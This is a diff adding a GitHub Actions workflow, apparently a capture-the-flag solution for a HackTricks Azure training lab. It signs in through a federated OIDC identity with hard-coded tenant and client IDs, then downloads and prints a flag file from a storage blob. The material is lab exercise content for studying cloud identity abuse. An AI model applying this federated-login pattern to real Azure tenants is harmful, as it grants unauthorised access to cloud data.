@@ -1,0 +1,22 @@
+name: Deploy to Azure
+on:
+  push: { branches: [main] }
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  get-flag:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Az CLI login
+        uses: azure/login@v2
+        with:
+          client-id: "320904b6-ade4-47ea-98b1-b40431a00b00"
+          tenant-id: "azure.training.hacktricks.xyz"
+          subscription-id: "764cc28a-0e45-4d5b-aca7-a1baf16a334b"
+          enable-AzPSSession: true
+      - name: Download flag
+        run: |
+          az storage blob download --account-name iamazurelab39f82a4ba  --container-name flag --name flag.txt --file flag.txt --auth-mode login
+      - name: Read flag
+        run: cat flag.txt
